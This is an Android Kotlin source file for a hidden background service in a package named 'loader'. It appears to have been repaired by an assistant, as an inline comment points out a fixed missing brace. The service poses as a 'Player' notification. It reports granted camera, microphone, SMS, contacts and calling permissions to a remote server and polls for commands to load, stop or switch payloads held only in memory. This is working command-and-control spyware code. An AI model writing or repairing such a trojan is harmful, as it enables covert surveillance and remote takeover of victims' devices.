package com.nexrtz.loader

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.IBinder
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlin.concurrent.thread

class CoreService : Service() {
    @Volatile private var running = true

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, createNotification())

        thread {
            while (running) {
                // 1. Report current permissions to the server
                val perms = mutableListOf<String>()
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED) perms.add("CAMERA")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED) perms.add("RECORD_AUDIO")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) perms.add("READ_SMS")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) perms.add("READ_CONTACTS")
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) perms.add("CALL_PHONE")

                PluginApi.reportPermissions(perms)

                // 2. Poll for commands
                val job = PluginApi.poll()
                if (job != null) {
                    val cmd = job.optString("command")

                    if (cmd == "load") {
                        val slot = job.getString("slot")
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            MemoryOnlyLoader.load(this, slot)
                        }
                    } else if (cmd == "stop") {
                        val slot = job.getString("slot")
                        MemoryOnlyLoader.stop(slot)
                        PluginApi.ackStatus(slot, "stopped")
                    } else if (cmd == "flip") {
                        val slot = job.getString("slot")
                        MemoryOnlyLoader.flip(slot)
                    } // <--- This closing brace was missing in your code
                } else {
                    Thread.sleep(1000) // Idle backoff
                }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int) = START_STICKY
    override fun onDestroy() { running = false; super.onDestroy() }

    private fun createNotification() =
        NotificationCompat.Builder(this, "core_service")
            .setContentTitle("Player").setContentText("")
            .setSmallIcon(android.R.drawable.ic_media_play)
            .setPriority(NotificationCompat.PRIORITY_MIN).build()

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel("core_service", "System Background Monitoring", NotificationManager.IMPORTANCE_LOW)
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }
}